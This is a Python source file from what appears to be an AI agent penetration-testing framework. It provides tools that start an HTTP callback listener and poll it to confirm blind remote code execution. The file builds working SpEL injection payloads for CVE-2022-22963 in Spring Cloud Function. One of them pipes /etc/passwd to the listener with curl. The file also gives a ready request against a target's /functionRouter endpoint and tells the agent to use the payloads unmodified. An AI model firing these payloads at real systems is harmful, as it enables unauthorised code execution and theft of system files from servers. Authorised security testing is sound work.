"""HTTP callback listener for verifying blind RCE exploitation.

Provides two agent tools:
  - start_callback_listener: binds a lightweight HTTP server on the host
  - check_callback_received: polls whether a callback token was hit

Used to verify blind command injection / RCE by having the target curl back
to the listener with a unique token.
"""

from __future__ import annotations

import logging
import secrets
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

from clearwing.agent.tooling import tool

logger = logging.getLogger(__name__)

# Module-level state: token → callback data
_callbacks: dict[str, dict] = {}
_servers: dict[int, ThreadingHTTPServer] = {}
_server_lock = threading.Lock()

# Auto-shutdown timeout (seconds)
_LISTENER_TTL = 600


class _CallbackHandler(BaseHTTPRequestHandler):
    """Handles incoming callback requests and records them."""

    def do_GET(self):
        self._handle()

    def do_POST(self):
        self._handle()

    def _handle(self):
        # Extract token from path: /callback/<token>
        parts = self.path.strip("/").split("/")
        if len(parts) >= 2 and parts[0] == "callback":
            token = parts[1]
            content_length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(content_length).decode("utf-8", errors="replace") if content_length else ""

            _callbacks[token] = {
                "received": True,
                "timestamp": time.time(),
                "source_ip": self.client_address[0],
                "request_body": body,
                "method": self.command,
                "path": self.path,
            }
            logger.info("Callback received for token %s from %s", token, self.client_address[0])
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"OK\n")
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, format, *args):
        # Suppress default stderr logging
        logger.debug("CallbackListener: %s", format % args)


def _auto_shutdown(port: int, ttl: float):
    """Shutdown the listener after TTL expires."""
    time.sleep(ttl)
    with _server_lock:
        server = _servers.pop(port, None)
    if server:
        server.shutdown()
        logger.debug("Callback listener on port %d auto-shutdown after %ds", port, ttl)


@tool
def start_callback_listener(port: int = 9999, lhost: str = "host.docker.internal") -> dict:
    """Start an HTTP callback listener to verify blind RCE.

    Binds a lightweight HTTP server on the specified port. Returns a unique
    token, callback URL, and pre-built SpEL payloads for Java targets.

    The listener auto-shuts-down after 10 minutes.

    For Java/Spring targets (like CVE-2022-22963), use the returned
    'spel_payload' directly as the spring.cloud.function.routing-expression
    header value. Uses T(java.lang.Runtime).getRuntime().exec() with curl.

    IMPORTANT: The lhost parameter must be an address the TARGET can reach
    (e.g. host.docker.internal for Docker targets). Do NOT use 127.0.0.1 —
    that resolves to the target container itself.

    Args:
        port: Port to bind on (default: 9999). If occupied, tries port+1 up to port+10.
        lhost: Address the target uses to reach this listener (default: host.docker.internal).

    Returns:
        Dict with keys: port, token, callback_url, spel_payload,
        spel_exfil_payload, status, message.
    """
    token = secrets.token_urlsafe(12)

    # Find an available port
    bound_port = None
    for candidate in range(port, port + 10):
        with _server_lock:
            if candidate in _servers:
                continue
        try:
            server = ThreadingHTTPServer(("0.0.0.0", candidate), _CallbackHandler)
            bound_port = candidate
            break
        except OSError:
            continue

    if not bound_port or not server:
        return {
            "status": "error",
            "message": f"Could not bind any port in range {port}-{port + 9}",
        }

    # Register token as pending
    _callbacks[token] = {"received": False}

    # Start server in background thread
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()

    with _server_lock:
        _servers[bound_port] = server

    # Schedule auto-shutdown
    threading.Thread(target=_auto_shutdown, args=(bound_port, _LISTENER_TTL), daemon=True).start()

    callback_path = f"/callback/{token}"
    callback_url = f"http://{lhost}:{bound_port}{callback_path}"
    logger.info("Callback listener started on port %d, token=%s", bound_port, token)

    # Pre-built SpEL payloads using Runtime.exec (proven for CVE-2022-22963)
    # MUST use bash -c wrapper — direct exec of curl doesn't reliably fire
    # in the JVM subprocess context (no shell PATH/env inheritance).
    spel_simple = (
        'T(java.lang.Runtime).getRuntime().exec(new String[]'
        f'{{"bash","-c","curl {callback_url}"}})'
    )
    spel_exfil = (
        'T(java.lang.Runtime).getRuntime().exec(new String[]'
        f'{{"bash","-c","curl -d @/etc/passwd {callback_url}"}})'
    )

    return {
        "status": "listening",
        "port": bound_port,
        "token": token,
        "callback_url": callback_url,
        "spel_payload": spel_simple,
        "spel_exfil_payload": spel_exfil,
        "usage_example": {
            "tool": "proxy_request",
            "args": {
                "method": "POST",
                "url": "http://TARGET:PORT/functionRouter",
                "headers": {
                    "spring.cloud.function.routing-expression": spel_simple,
                    "Content-Type": "text/plain",
                },
                "body": "test",
            },
        },
        "message": (
            f"Listening on 0.0.0.0:{bound_port}. "
            f"CRITICAL: Use the EXACT 'spel_payload' value as the header — do NOT "
            f"modify it or construct your own. The payload uses bash -c which is "
            f"REQUIRED for the JVM subprocess to resolve DNS and exec curl. "
            f"Do NOT use 127.0.0.1 as lhost (that resolves to the target itself). "
            f"Do NOT try alternative IPs — host.docker.internal is confirmed working. "
            f"EXPECTED BEHAVIOR: The exploit returns HTTP 500 — this is NORMAL. "
            f"Verify success ONLY via check_callback_received(token='{token}')."
        ),
    }


@tool
def check_callback_received(token: str, timeout: int = 10) -> dict:
    """Check whether a callback token has been hit by the target.

    Polls for the specified timeout period before returning.

    Args:
        token: The token returned by start_callback_listener.
        timeout: Seconds to wait for the callback (default: 10).

    Returns:
        Dict with keys: received (bool), request_body, source_ip, timestamp.
    """
    deadline = time.time() + timeout
    while time.time() < deadline:
        entry = _callbacks.get(token, {})
        if entry.get("received"):
            return {
                "received": True,
                "source_ip": entry.get("source_ip", ""),
                "request_body": entry.get("request_body", ""),
                "timestamp": entry.get("timestamp", 0),
                "method": entry.get("method", ""),
                "message": "Callback received — RCE verified.",
            }
        time.sleep(0.5)

    return {
        "received": False,
        "message": f"No callback received within {timeout}s. "
        "RCE may have failed or target cannot reach the listener.",
    }
